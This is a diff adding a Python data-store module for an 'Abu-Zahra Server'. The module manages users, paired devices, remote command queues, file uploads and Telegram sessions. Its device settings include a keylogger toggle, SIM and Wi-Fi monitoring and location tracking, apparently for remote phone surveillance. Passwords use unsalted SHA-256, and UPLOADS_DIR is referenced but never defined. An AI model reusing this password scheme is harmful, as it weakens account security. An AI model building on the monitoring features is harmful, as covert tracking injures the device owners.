@@ -1,0 +1,703 @@
+     1→"""
+     2→Data Store Module - Central data management for Abu-Zahra Server.
+     3→Handles all in-memory data, JSON persistence, and user/device management.
+     4→Implements email-based account system with unique User IDs.
+     5→"""
+     6→
+     7→import json
+     8→import os
+     9→import time
+    10→import uuid
+    11→import asyncio
+    12→import hashlib
+    13→from typing import Optional, Any, Dict, List
+    14→from datetime import datetime, timedelta
+    15→
+    16→from .config import (
+    17→    DATA_DIR, PAIRING_CODE_LENGTH, PAIRING_CODE_CHARS,
+    18→    PAIRING_CODE_EXPIRE_SECONDS, MAX_EVENTS, MAX_LINK_CODES,
+    19→    DEVICE_OFFLINE_TIMEOUT, JWT_EXPIRE_HOURS, JWT_SECRET, ADMIN_EMAIL,
+    20→    ADMIN_USERNAME, ADMIN_PASSWORD
+    21→)
+    22→
+    23→# ─── File Paths ───────────────────────────────────────────────
+    24→def _path(name: str) -> str:
+    25→    return os.path.join(DATA_DIR, name)
+    26→
+    27→# ─── JSON File I/O ───────────────────────────────────────────
+    28→_json_lock = asyncio.Lock()
+    29→
+    30→async def _load_json(name: str, default=None) -> Any:
+    31→    p = _path(name)
+    32→    if os.path.exists(p):
+    33→        try:
+    34→            with open(p, 'r', encoding='utf-8') as f:
+    35→                return json.load(f)
+    36→        except (json.JSONDecodeError, IOError):
+    37→            return default if default is not None else []
+    38→    return default if default is not None else []
+    39→
+    40→async def _save_json(name: str, data: Any) -> None:
+    41→    async with _json_lock:
+    42→        p = _path(name)
+    43→        with open(p, 'w', encoding='utf-8') as f:
+    44→            json.dump(data, f, ensure_ascii=False, indent=2, default=str)
+    45→
+    46→# ─── In-Memory Stores ─────────────────────────────────────────
+    47→class DataStore:
+    48→    """Central data store for all server data."""
+    49→    
+    50→    def __init__(self):
+    51→        self.start_time = time.time()
+    52→        
+    53→        # Users: {user_id: {id, email, username, password_hash, role, created_at, devices[], settings, is_active}}
+    54→        self.users: Dict[str, dict] = {}
+    55→        
+    56→        # Sessions: {token: {user_id, username, role, created_at, expires_at, ip, user_agent}}
+    57→        self.sessions: Dict[str, dict] = {}
+    58→        
+    59→        # Devices: {device_id: {id, token, name, model, brand, os, battery, network, location, last_seen, created_at, owner_id, ...}}
+    60→        self.devices: Dict[str, dict] = {}
+    61→        
+    62→        # Commands: {command_id: {id, device_id, command, params, status, created_at, sent_at, result, completed_at, requested_by, source}}
+    63→        self.commands: Dict[str, dict] = {}
+    64→        self._command_counter = 0
+    65→        
+    66→        # Events: [{time, event, details, level, device_id, user_id}]
+    67→        self.events: List[dict] = []
+    68→        
+    69→        # Settings (global): {key: value}
+    70→        self.settings: dict = {
+    71→            "sync_interval": 15,
+    72→            "location_interval": 300,
+    73→            "auto_location": False,
+    74→            "auto_sync": True,
+    75→            "language": "ar",
+    76→            "notifications": True,
+    77→            "keylogger": False,
+    78→            "sim_detect": True,
+    79→            "wifi_monitor": False,
+    80→            "geofences": [],
+    81→        }
+    82→        
+    83→        # Pairing Codes: {code: {code, created_at, used, device_id, user_id, session_id, used_at, expires_at}}
+    84→        self.pairing_codes: Dict[str, dict] = {}
+    85→        
+    86→        # File tracking: {file_id: {id, device_id, filename, file_type, size, uploaded_at, expires_at, retrieved, command_id, caption}}
+    87→        self.files: Dict[str, dict] = {}
+    88→        
+    89→        # Rate limiting
+    90→        self._rate_counters: Dict[str, list] = {}
+    91→        self._last_link_code_time: float = 0
+    92→        self._device_last_online: Dict[str, bool] = {}
+    93→        self._device_battery_alert: Dict[str, float] = {}
+    94→        
+    95→        # Streaming
+    96→        self.stream_connections: Dict[str, dict] = {}
+    97→        self.latest_frames: Dict[str, dict] = {}
+    98→        self.jpeg_stream_tasks: Dict[str, asyncio.Task] = {}
+    99→        self.jpeg_stream_info: Dict[str, dict] = {}
+   100→        
+   101→        # Dashboard WebSocket clients
+   102→        self.dashboard_ws_clients: set = set()
+   103→        
+   104→        # Pending messages (for Telegram tracking)
+   105→        self.pending_messages: Dict[str, dict] = {}
+   106→        self.batch_operations: Dict[str, dict] = {}
+   107→        
+   108→        # Dedup sets
+   109→        self._processed_results: set = set()
+   110→        self._tg_processed_updates: set = set()
+   111→        self._tg_processed_messages: set = set()
+   112→        
+   113→        # IP to device mapping (for multipart uploads)
+   114→        self._ip_device_map: Dict[str, str] = {}
+   115→        
+   116→        # Telegram per-user sessions: {chat_id: {user_id, authenticated, devices[], selected_device, ...}}
+   117→        self.tg_sessions: Dict[str, dict] = {}
+   118→        
+   119→        # Stats
+   120→        self.api_hits = 0
+   121→        self.messages_sent = 0
+   122→
+   123→    # ─── Persistence ──────────────────────────────────────────
+   124→    async def load_all(self):
+   125→        """Load all data from JSON files on startup."""
+   126→        self.devices = {d['id']: d for d in await _load_json("devices.json", [])}
+   127→        self.events = await _load_json("events.json", [])
+   128→        self.settings = await _load_json("settings.json", self.settings)
+   129→        self.pairing_codes = {c['code']: c for c in await _load_json("link_codes.json", [])}
+   130→        self.sessions = {s['token']: s for s in await _load_json("sessions.json", [])}
+   131→        self.users = {u['id']: u for u in await _load_json("users.json", [])}
+   132→        
+   133→        # Ensure admin user exists
+   134→        if not self.users:
+   135→            await self._create_admin_user()
+   136→        
+   137→        # Clean expired sessions
+   138→        await self.cleanup_expired_sessions()
+   139→        
+   140→        # Clean expired pairing codes
+   141→        await self.cleanup_expired_pairing_codes()
+   142→        
+   143→        # Initialize device online states
+   144→        for did, dev in self.devices.items():
+   145→            last = dev.get('last_seen', 0)
+   146→            online = (time.time() - last) < DEVICE_OFFLINE_TIMEOUT if last else False
+   147→            self._device_last_online[did] = online
+   148→
+   149→    async def save_all(self):
+   150→        """Save all data to JSON files."""
+   151→        await asyncio.gather(
+   152→            _save_json("devices.json", list(self.devices.values())),
+   153→            _save_json("events.json", self.events[-MAX_EVENTS:]),
+   154→            _save_json("settings.json", self.settings),
+   155→            _save_json("link_codes.json", list(self.pairing_codes.values())[-MAX_LINK_CODES:]),
+   156→            _save_json("sessions.json", list(self.sessions.values())),
+   157→            _save_json("users.json", list(self.users.values())),
+   158→        )
+   159→
+   160→    async def save_devices(self):
+   161→        await _save_json("devices.json", list(self.devices.values()))
+   162→
+   163→    async def save_events(self):
+   164→        await _save_json("events.json", self.events[-MAX_EVENTS:])
+   165→
+   166→    async def save_users(self):
+   167→        await _save_json("users.json", list(self.users.values()))
+   168→
+   169→    async def save_sessions(self):
+   170→        await _save_json("sessions.json", list(self.sessions.values()))
+   171→
+   172→    # ─── User Management (Email-based) ────────────────────────
+   173→    
+   174→    @staticmethod
+   175→    def _hash_password(password: str) -> str:
+   176→        return hashlib.sha256(password.encode()).hexdigest()
+   177→    
+   178→    @staticmethod
+   179→    def generate_user_id() -> str:
+   180→        return f"USR-{uuid.uuid4().hex[:12].upper()}"
+   181→    
+   182→    async def _create_admin_user(self):
+   183→        """Create default admin user on first run."""
+   184→        user_id = self.generate_user_id()
+   185→        self.users[user_id] = {
+   186→            "id": user_id,
+   187→            "email": ADMIN_EMAIL,
+   188→            "username": ADMIN_USERNAME,
+   189→            "password_hash": self._hash_password(ADMIN_PASSWORD),
+   190→            "role": "admin",
+   191→            "created_at": datetime.utcnow().isoformat(),
+   192→            "is_active": True,
+   193→            "devices": [],
+   194→            "settings": {},
+   195→        }
+   196→        await self.save_users()
+   197→        await self.add_event("system", "Admin user created", "info")
+   198→
+   199→    async def create_user(self, email: str, username: str, password: str, role: str = "user") -> dict:
+   200→        """Create a new user account. Returns user dict or raises ValueError."""
+   201→        email = email.lower().strip()
+   202→        
+   203→        # Check uniqueness
+   204→        for u in self.users.values():
+   205→            if u['email'] == email:
+   206→                raise ValueError("البريد الإلكتروني مسجل مسبقاً")
+   207→            if u['username'] == username:
+   208→                raise ValueError("اسم المستخدم مسجل مسبقاً")
+   209→        
+   210→        user_id = self.generate_user_id()
+   211→        user = {
+   212→            "id": user_id,
+   213→            "email": email,
+   214→            "username": username,
+   215→            "password_hash": self._hash_password(password),
+   216→            "role": role,
+   217→            "created_at": datetime.utcnow().isoformat(),
+   218→            "is_active": True,
+   219→            "devices": [],
+   220→            "settings": {},
+   221→        }
+   222→        self.users[user_id] = user
+   223→        await self.save_users()
+   224→        await self.add_event("system", f"User created: {username} ({email})", "success")
+   225→        return user
+   226→
+   227→    async def authenticate_user(self, username_or_email: str, password: str) -> Optional[dict]:
+   228→        """Authenticate user by username or email + password. Returns user dict or None."""
+   229→        username_or_email = username_or_email.strip().lower()
+   230→        password_hash = self._hash_password(password)
+   231→        
+   232→        for u in self.users.values():
+   233→            if (u['email'] == username_or_email or u['username'].lower() == username_or_email) and u['password_hash'] == password_hash:
+   234→                if not u.get('is_active', True):
+   235→                    return None
+   236→                return u
+   237→        return None
+   238→
+   239→    async def get_user(self, user_id: str) -> Optional[dict]:
+   240→        return self.users.get(user_id)
+   241→
+   242→    async def get_user_devices(self, user_id: str) -> List[dict]:
+   243→        """Get all devices owned by a user. Admin sees all."""
+   244→        user = self.users.get(user_id)
+   245→        if not user:
+   246→            return []
+   247→        if user.get('role') == 'admin':
+   248→            return list(self.devices.values())
+   249→        return [d for d in self.devices.values() if d.get('owner_id') == user_id]
+   250→
+   251→    async def update_user(self, user_id: str, updates: dict) -> bool:
+   252→        user = self.users.get(user_id)
+   253→        if not user:
+   254→            return False
+   255→        for k, v in updates.items():
+   256→            if k == 'password':
+   257→                user['password_hash'] = self._hash_password(v)
+   258→            elif k in ('email', 'username', 'role', 'is_active', 'settings'):
+   259→                user[k] = v
+   260→        await self.save_users()
+   261→        return True
+   262→
+   263→    async def delete_user(self, user_id: str) -> bool:
+   264→        if user_id not in self.users:
+   265→            return False
+   266→        del self.users[user_id]
+   267→        await self.save_users()
+   268→        return True
+   269→
+   270→    async def list_users(self) -> List[dict]:
+   271→        return list(self.users.values())
+   272→
+   273→    # ─── Session Management ───────────────────────────────────
+   274→    
+   275→    def create_session(self, user_id: str, username: str, role: str, ip: str = "", user_agent: str = "", source: str = "web") -> dict:
+   276→        token = secrets.token_hex(32)
+   277→        now = datetime.utcnow()
+   278→        session = {
+   279→            "token": token,
+   280→            "user_id": user_id,
+   281→            "username": username,
+   282→            "role": role,
+   283→            "created_at": now.isoformat(),
+   284→            "expires_at": (now + timedelta(hours=JWT_EXPIRE_HOURS)).isoformat(),
+   285→            "ip": ip,
+   286→            "user_agent": user_agent,
+   287→            "source": source,
+   288→        }
+   289→        self.sessions[token] = session
+   290→        return session
+   291→
+   292→    def validate_session(self, token: str) -> Optional[dict]:
+   293→        session = self.sessions.get(token)
+   294→        if not session:
+   295→            return None
+   296→        try:
+   297→            expires = datetime.fromisoformat(session['expires_at'])
+   298→            # Ensure naive comparison (strip tz if present)
+   299→            if expires.tzinfo is not None:
+   300→                from datetime import timezone
+   301→                expires = expires.replace(tzinfo=None)
+   302→            if datetime.utcnow() > expires:
+   303→                del self.sessions[token]
+   304→                return None
+   305→        except (ValueError, KeyError):
+   306→            return None
+   307→        return session
+   308→
+   309→    async def cleanup_expired_sessions(self):
+   310→        now = datetime.utcnow()
+   311→        to_remove = []
+   312→        for token, s in self.sessions.items():
+   313→            try:
+   314→                expires = datetime.fromisoformat(s['expires_at'])
+   315→                if expires.tzinfo is not None:
+   316→                    expires = expires.replace(tzinfo=None)
+   317→                if expires < now:
+   318→                    to_remove.append(token)
+   319→            except (ValueError, KeyError):
+   320→                to_remove.append(token)
+   321→        for t in to_remove:
+   322→            del self.sessions[t]
+   323→        if to_remove:
+   324→            await self.save_sessions()
+   325→
+   326→    # ─── Device Management ────────────────────────────────────
+   327→    
+   328→    async def register_device(self, device_id: str, token: str, pairing_code: str,
+   329→                               model: str = "", brand: str = "", os_version: str = "",
+   330→                               user_id: str = None) -> Optional[dict]:
+   331→        """Register a device using a pairing code. Assigns to user who created the code."""
+   332→        code_data = self.pairing_codes.get(pairing_code)
+   333→        if not code_data:
+   334→            return None
+   335→        if code_data.get('used'):
+   336→            return None
+   337→        try:
+   338→            expires = datetime.fromisoformat(code_data['expires_at'])
+   339→            if datetime.utcnow() > expires:
+   340→                return None
+   341→        except (ValueError, KeyError):
+   342→            return None
+   343→        
+   344→        # Mark code as used
+   345→        code_data['used'] = True
+   346→        code_data['used_at'] = datetime.utcnow().isoformat()
+   347→        code_data['device_id'] = device_id
+   348→        
+   349→        # Determine owner
+   350→        owner_id = code_data.get('user_id') or user_id
+   351→        if not owner_id:
+   352→            # Assign to admin
+   353→            for u in self.users.values():
+   354→                if u.get('role') == 'admin':
+   355→                    owner_id = u['id']
+   356→                    break
+   357→        
+   358→        now = datetime.utcnow().isoformat()
+   359→        device = {
+   360→            "id": device_id,
+   361→            "token": token,
+   362→            "active": True,
+   363→            "name": model or "Unknown Device",
+   364→            "model": model,
+   365→            "brand": brand,
+   366→            "os": os_version,
+   367→            "battery": None,
+   368→            "network": None,
+   369→            "location": None,
+   370→            "last_seen": now,
+   371→            "created_at": now,
+   372→            "owner_id": owner_id,
+   373→            "ip": "",
+   374→            "settings": {},
+   375→        }
+   376→        self.devices[device_id] = device
+   377→        self._device_last_online[device_id] = True
+   378→        
+   379→        # Add to user's device list
+   380→        user = self.users.get(owner_id)
+   381→        if user and device_id not in user.get('devices', []):
+   382→            user.setdefault('devices', []).append(device_id)
+   383→        
+   384→        await self.save_devices()
+   385→        await self.save_users()
+   386→        await self.add_event("device", f"Device registered: {model} ({device_id})", "success", device_id=device_id)
+   387→        return device
+   388→
+   389→    async def get_device(self, device_id: str) -> Optional[dict]:
+   390→        return self.devices.get(device_id)
+   391→
+   392→    async def get_user_device(self, user_id: str, device_id: str) -> Optional[dict]:
+   393→        device = self.devices.get(device_id)
+   394→        if not device:
+   395→            return None
+   396→        user = self.users.get(user_id)
+   397→        if not user:
+   398→            return None
+   399→        if user.get('role') == 'admin' or device.get('owner_id') == user_id:
+   400→            return device
+   401→        return None
+   402→
+   403→    async def update_device(self, device_id: str, updates: dict) -> bool:
+   404→        device = self.devices.get(device_id)
+   405→        if not device:
+   406→            return False
+   407→        device.update(updates)
+   408→        await self.save_devices()
+   409→        return True
+   410→
+   411→    async def unlink_device(self, device_id: str, user_id: str) -> bool:
+   412→        device = self.devices.get(device_id)
+   413→        if not device:
+   414→            return False
+   415→        user = self.users.get(user_id)
+   416→        if not user or (user.get('role') != 'admin' and device.get('owner_id') != user_id):
+   417→            return False
+   418→        device['active'] = False
+   419→        # Remove from user's device list
+   420→        if device_id in user.get('devices', []):
+   421→            user['devices'].remove(device_id)
+   422→        await self.save_devices()
+   423→        await self.save_users()
+   424→        await self.add_event("device", f"Device unlinked: {device_id}", "warning", device_id=device_id)
+   425→        return True
+   426→
+   427→    def get_device_token(self, device_id: str) -> Optional[str]:
+   428→        device = self.devices.get(device_id)
+   429→        return device['token'] if device else None
+   430→
+   431→    def validate_device_token(self, device_id: str, token: str) -> bool:
+   432→        device = self.devices.get(device_id)
+   433→        return device is not None and device.get('token') == token and device.get('active', True)
+   434→
+   435→    # ─── Pairing Code Management ──────────────────────────────
+   436→    
+   437→    def generate_pairing_code(self, user_id: str) -> dict:
+   438→        import secrets as sec
+   439→        code = ''.join(sec.choice(PAIRING_CODE_CHARS) for _ in range(PAIRING_CODE_LENGTH))
+   440→        now = datetime.utcnow()
+   441→        code_data = {
+   442→            "code": code,
+   443→            "created_at": now.isoformat(),
+   444→            "expires_at": (now + timedelta(seconds=PAIRING_CODE_EXPIRE_SECONDS)).isoformat(),
+   445→            "used": False,
+   446→            "device_id": None,
+   447→            "user_id": user_id,
+   448→            "session_id": str(uuid.uuid4()),
+   449→            "used_at": None,
+   450→        }
+   451→        self.pairing_codes[code] = code_data
+   452→        return code_data
+   453→
+   454→    async def verify_pairing_code(self, code: str) -> Optional[dict]:
+   455→        code_data = self.pairing_codes.get(code)
+   456→        if not code_data:
+   457→            return None
+   458→        if code_data.get('used'):
+   459→            return None
+   460→        try:
+   461→            expires = datetime.fromisoformat(code_data['expires_at'])
+   462→            if datetime.utcnow() > expires:
+   463→                return None
+   464→        except (ValueError, KeyError):
+   465→            return None
+   466→        return code_data
+   467→
+   468→    async def cleanup_expired_pairing_codes(self):
+   469→        now = datetime.utcnow()
+   470→        to_remove = []
+   471→        for code, c in self.pairing_codes.items():
+   472→            if c.get('used'):
+   473→                continue
+   474→            try:
+   475→                expires = datetime.fromisoformat(c['expires_at'])
+   476→                if expires.tzinfo is not None:
+   477→                    expires = expires.replace(tzinfo=None)
+   478→                if expires < now:
+   479→                    to_remove.append(code)
+   480→            except (ValueError, KeyError):
+   481→                to_remove.append(code)
+   482→        for c in to_remove:
+   483→            del self.pairing_codes[c]
+   484→        if to_remove:
+   485→            await _save_json("link_codes.json", list(self.pairing_codes.values())[-MAX_LINK_CODES:])
+   486→
+   487→    # ─── Command Management ───────────────────────────────────
+   488→    
+   489→    async def queue_command(self, device_id: str, command: str, params: dict = None,
+   490→                            requested_by: str = "", source: str = "web") -> dict:
+   491→        self._command_counter += 1
+   492→        cmd_id = f"cmd_{int(time.time()*1000)}_{self._command_counter}"
+   493→        now = datetime.utcnow().isoformat()
+   494→        cmd = {
+   495→            "id": cmd_id,
+   496→            "device_id": device_id,
+   497→            "command": command,
+   498→            "params": params or {},
+   499→            "status": "pending",
+   500→            "created_at": now,
+   501→            "sent_at": None,
+   502→            "result": None,
+   503→            "completed_at": None,
+   504→            "requested_by": requested_by,
+   505→            "source": source,
+   506→        }
+   507→        self.commands[cmd_id] = cmd
+   508→        # Also save pending commands to file for device polling
+   509→        await self._save_pending_commands(device_id)
+   510→        return cmd
+   511→
+   512→    async def get_pending_commands(self, device_id: str) -> List[dict]:
+   513→        pending = [cmd for cmd in self.commands.values()
+   514→                   if cmd['device_id'] == device_id and cmd['status'] == 'pending']
+   515→        return pending
+   516→
+   517→    async def update_command_result(self, command_id: str, status: str, result: Any = None) -> bool:
+   518→        cmd = self.commands.get(command_id)
+   519→        if not cmd:
+   520→            return False
+   521→        cmd['status'] = status
+   522→        cmd['result'] = result
+   523→        cmd['completed_at'] = datetime.utcnow().isoformat()
+   524→        return True
+   525→
+   526→    async def _save_pending_commands(self, device_id: str):
+   527→        pending = [cmd for cmd in self.commands.values()
+   528→                   if cmd['device_id'] == device_id and cmd['status'] == 'pending']
+   529→        safe_id = "".join(c for c in device_id if c.isalnum() or c in '-_')
+   530→        await _save_json(f"pending_{safe_id}.json", pending)
+   531→
+   532→    async def get_commands_history(self, device_id: str = None, limit: int = 100) -> List[dict]:
+   533→        cmds = list(self.commands.values())
+   534→        if device_id:
+   535→            cmds = [c for c in cmds if c['device_id'] == device_id]
+   536→        cmds.sort(key=lambda x: x.get('created_at', ''), reverse=True)
+   537→        return cmds[:limit]
+   538→
+   539→    # ─── Event Management ─────────────────────────────────────
+   540→    
+   541→    async def add_event(self, category: str, event: str, level: str = "info",
+   542→                        device_id: str = None, user_id: str = None, details: str = ""):
+   543→        evt = {
+   544→            "time": datetime.utcnow().isoformat(),
+   545→            "event": event,
+   546→            "category": category,
+   547→            "level": level,
+   548→            "device_id": device_id or "",
+   549→            "user_id": user_id or "",
+   550→            "details": details,
+   551→        }
+   552→        self.events.append(evt)
+   553→        if len(self.events) > MAX_EVENTS * 1.5:
+   554→            self.events = self.events[-MAX_EVENTS:]
+   555→        # Don't save on every event (performance); periodic save handles it
+   556→        if len(self.events) % 10 == 0:
+   557→            await self.save_events()
+   558→
+   559→    async def get_events(self, device_id: str = None, event_type: str = None, limit: int = 100) -> List[dict]:
+   560→        events = self.events
+   561→        if device_id:
+   562→            events = [e for e in events if e.get('device_id') == device_id]
+   563→        if event_type:
+   564→            events = [e for e in events if e.get('level') == event_type]
+   565→        return list(reversed(events[-limit:]))
+   566→
+   567→    # ─── File Management (Temporary Storage) ──────────────────
+   568→    
+   569→    async def add_file(self, device_id: str, filename: str, file_type: str,
+   570→                       size: int, command_id: str = None, caption: str = "") -> dict:
+   571→        file_id = str(uuid.uuid4())
+   572→        now = datetime.utcnow()
+   573→        file_data = {
+   574→            "id": file_id,
+   575→            "device_id": device_id,
+   576→            "filename": filename,
+   577→            "file_type": file_type,
+   578→            "size": size,
+   579→            "uploaded_at": now.isoformat(),
+   580→            "expires_at": (now + timedelta(seconds=FILE_TEMP_EXPIRE_SECONDS)).isoformat(),
+   581→            "retrieved": False,
+   582→            "command_id": command_id,
+   583→            "caption": caption,
+   584→            "path": os.path.join(UPLOADS_DIR, f"{device_id}_{filename}"),
+   585→        }
+   586→        self.files[file_id] = file_data
+   587→        return file_data
+   588→
+   589→    async def get_file(self, file_id: str) -> Optional[dict]:
+   590→        return self.files.get(file_id)
+   591→
+   592→    async def mark_file_retrieved(self, file_id: str):
+   593→        f = self.files.get(file_id)
+   594→        if f:
+   595→            f['retrieved'] = True
+   596→
+   597→    async def cleanup_expired_files(self):
+   598→        """Remove files that have expired or been retrieved."""
+   599→        now = datetime.utcnow()
+   600→        to_remove = []
+   601→        for fid, f in self.files.items():
+   602→            try:
+   603→                expires = datetime.fromisoformat(f['expires_at'])
+   604→                should_remove = (now > expires) or f.get('retrieved', False)
+   605→                if should_remove:
+   606→                    to_remove.append(fid)
+   607→                    # Delete actual file
+   608→                    path = f.get('path', '')
+   609→                    if path and os.path.exists(path):
+   610→                        try:
+   611→                            os.remove(path)
+   612→                        except OSError:
+   613→                            pass
+   614→            except (ValueError, KeyError):
+   615→                to_remove.append(fid)
+   616→        for fid in to_remove:
+   617→            del self.files[fid]
+   618→
+   619→    # ─── Device Heartbeat & Status ────────────────────────────
+   620→    
+   621→    async def update_heartbeat(self, device_id: str, status: str, battery: int = None):
+   622→        device = self.devices.get(device_id)
+   623→        if not device:
+   624→            return
+   625→        now = datetime.utcnow().isoformat()
+   626→        device['last_seen'] = now
+   627→        if battery is not None:
+   628→            device['battery'] = battery
+   629→        
+   630→        was_offline = not self._device_last_online.get(device_id, False)
+   631→        is_online = status == "online"
+   632→        self._device_last_online[device_id] = is_online
+   633→        
+   634→        if was_offline and is_online:
+   635→            await self.add_event("connection", f"Device online: {device.get('name', device_id)}", "success", device_id=device_id)
+   636→        elif not was_offline and not is_online:
+   637→            await self.add_event("connection", f"Device offline: {device.get('name', device_id)}", "warning", device_id=device_id)
+   638→
+   639→    async def check_device_online_status(self):
+   640→        """Background task: mark devices offline if no heartbeat."""
+   641→        now = time.time()
+   642→        for device_id, online in list(self._device_last_online.items()):
+   643→            if online:
+   644→                device = self.devices.get(device_id)
+   645→                if device:
+   646→                    try:
+   647→                        last_str = device.get('last_seen', '')
+   648→                        if not last_str:
+   649→                            continue
+   650→                        last_dt = datetime.fromisoformat(last_str)
+   651→                        if last_dt.tzinfo is not None:
+   652→                            last_dt = last_dt.replace(tzinfo=None)
+   653→                        last_ts = last_dt.timestamp()
+   654→                        if now - last_ts > DEVICE_OFFLINE_TIMEOUT:
+   655→                            self._device_last_online[device_id] = False
+   656→                            await self.add_event("connection", f"Device offline (timeout): {device.get('name', device_id)}", "warning", device_id=device_id)
+   657→                    except (ValueError, TypeError):
+   658→                        pass
+   659→
+   660→    # ─── Rate Limiting ────────────────────────────────────────
+   661→    
+   662→    def check_rate_limit(self, key: str, max_count: int, window: float) -> bool:
+   663→        """Returns True if request is allowed, False if rate limited."""
+   664→        now = time.time()
+   665→        timestamps = self._rate_counters.setdefault(key, [])
+   666→        # Clean old entries
+   667→        timestamps[:] = [t for t in timestamps if now - t < window]
+   668→        if len(timestamps) >= max_count:
+   669→            return False
+   670→        timestamps.append(now)
+   671→        return True
+   672→
+   673→    # ─── Statistics ───────────────────────────────────────────
+   674→    
+   675→    def get_stats(self) -> dict:
+   676→        total_devices = len(self.devices)
+   677→        online_devices = sum(1 for d in self.devices.values() if self._device_last_online.get(d['id'], False))
+   678→        pending_commands = sum(1 for c in self.commands.values() if c['status'] == 'pending')
+   679→        completed_commands = sum(1 for c in self.commands.values() if c['status'] == 'completed')
+   680→        total_commands = len(self.commands)
+   681→        total_users = len(self.users)
+   682→        
+   683→        return {
+   684→            "uptime": int(time.time() - self.start_time),
+   685→            "devices_total": total_devices,
+   686→            "devices_online": online_devices,
+   687→            "devices_offline": total_devices - online_devices,
+   688→            "commands_total": total_commands,
+   689→            "commands_pending": pending_commands,
+   690→            "commands_completed": completed_commands,
+   691→            "events_count": len(self.events),
+   692→            "users_total": total_users,
+   693→            "api_hits": self.api_hits,
+   694→            "messages_sent": self.messages_sent,
+   695→            "files_active": len(self.files),
+   696→            "version": VERSION,
+   697→        }
+   698→
+   699→# ─── Global Instance ──────────────────────────────────────────
+   700→from .config import VERSION, FILE_TEMP_EXPIRE_SECONDS
+   701→import secrets
+   702→
+   703→store = DataStore()
